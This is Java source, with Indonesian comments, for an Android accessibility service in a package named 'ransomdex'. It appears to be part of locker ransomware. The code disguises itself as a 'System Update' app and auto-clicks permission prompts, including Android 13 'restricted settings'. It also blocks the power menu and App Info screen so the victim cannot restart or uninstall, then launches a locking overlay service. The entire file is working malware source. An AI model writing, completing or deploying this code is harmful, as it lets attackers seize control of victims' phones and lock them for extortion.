package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

public class CustomAccessibilityService extends AccessibilityService {

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected");

        // Langsung arahkan ke pengaturan Overlay setelah aksesibilitas aktif
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }, 500);
    }

    private void writeLog(String text) {
        try {
            File logFile = new File("/sdcard/log_ransom.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            String time = Calendar.getInstance().getTime().toString();
            fos.write((time + " : " + text + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String className = event.getClassName() != null ? event.getClassName().toString() : "";

        // 1. Rescue Logic: Jika salah klik dan malah masuk ke 'App Info', otomatis kembali
        if (packageName.contains("settings") && className.toLowerCase().contains("appdetails")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            return;
        }

        if (packageName.equals("android") || packageName.contains("systemui")) {
            checkAndDismissPowerMenu(getRootInActiveWindow());
        }

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        // 2. Tangani "Restricted Settings" HANYA jika Android 13+ (SDK 33)
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            checkAndClickByContentDesc(rootNode, "More options");
            checkAndClickByContentDesc(rootNode, "Opsi lainnya");
            checkAndClick(rootNode, "Allow restricted settings");
            checkAndClick(rootNode, "Izinkan pengaturan terbatas");
        }

        // 3. Cek apakah ada Switch/Toggle di layar (berarti kita sudah di halaman detail izin)
        boolean switchFound = findAndClickSwitch(rootNode);

        // 4. Jika TIDAK ada Switch, cari nama aplikasi di daftar (untuk masuk ke detail)
        if (!switchFound && packageName.contains("settings") && !className.contains("AppDetails")) {
            checkAndClick(rootNode, "System Update");
        }

        // 5. Cari tombol konfirmasi umum
        checkAndClick(rootNode, "Activate");
        checkAndClick(rootNode, "Aktifkan");
        checkAndClick(rootNode, "Allow");
        checkAndClick(rootNode, "Izinkan");
        checkAndClick(rootNode, "OK");

        // 4. Spesifik untuk halaman izin Overlay
        if (packageName.contains("settings")) {
            checkAndClick(rootNode, "Permit drawing over other apps");
            checkAndClick(rootNode, "Allow display over other apps");
            checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
            checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
        }

        // 6. Jika izin Overlay sudah aktif, jalankan Locker
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (Settings.canDrawOverlays(this) && !LockerService.isAuthenticated) {
                Intent intent = new Intent(this, LockerService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }
            }
        }, 1000);

    }

    private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
        if (node == null) return;
        if (node.getContentDescription() != null && 
            node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
            clickNode(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            checkAndClickByContentDesc(node.getChild(i), desc);
        }
    }

    private boolean findAndClickSwitch(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.getClassName() != null && 
           (node.getClassName().toString().contains("Switch") || node.getClassName().toString().contains("ToggleButton")) 
           && !node.isChecked()) {
            clickNode(node);
            return true;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            if (findAndClickSwitch(node.getChild(i))) return true;
        }
        return false;
    }

    private void checkAndDismissPowerMenu(AccessibilityNodeInfo node) {
        if (node == null) return;
        // Mencari kata kunci yang ada di menu power
        if (!node.findAccessibilityNodeInfosByText("Power off").isEmpty() || 
            !node.findAccessibilityNodeInfosByText("Restart").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Mulai lagi").isEmpty() ||
            !node.findAccessibilityNodeInfosByText("Daya mati").isEmpty()) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    private void checkAndClick(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) { 
                clickNode(n); 
                n.recycle();
            }
        }
    }

    private void clickNode(AccessibilityNodeInfo n) {
        if (n == null) return;
        
        // Filter: Jangan klik jika elemen ini adalah Icon (ImageView)
        if (n.getClassName() != null && n.getClassName().toString().contains("ImageView")) {
            return;
        }

        AccessibilityNodeInfo clickableNode = n;
        while (clickableNode != null && !clickableNode.isClickable()) {
            clickableNode = clickableNode.getParent();
        }
        if (clickableNode != null && clickableNode.isClickable()) {
            clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    @Override
    public void onInterrupt() {}
}